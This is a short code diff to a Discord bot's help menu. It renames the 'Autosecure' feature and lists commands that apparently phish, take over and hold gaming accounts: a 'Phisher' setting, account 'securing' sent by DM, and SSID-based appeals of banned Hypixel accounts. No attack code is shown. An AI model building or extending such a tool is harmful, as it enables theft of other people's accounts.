@@ -8,7 +8,7 @@ module.exports = {
                 {
                     name: 'Commands',
                     value:
-                        `* **/bots** → Manage all bot settings (Bot, Autosecure, Phisher, Claiming & Users and way more)\n` +
+                        `* **/bots** → Manage all bot settings (Bot, VinGr0ups3cur3, Phisher, Claiming & Users and way more)\n` +
                          `* **/secure** → Secure an account using all sorts of methods and settings from /secure Configuration and receive it via DM\n` +
                         `* **/accounts** → View all your secured accounts and manage them\n` +
                         `* **/appeal** → Appeal a security-banned Hypixel account using SSID within 5 minutes.\n` +
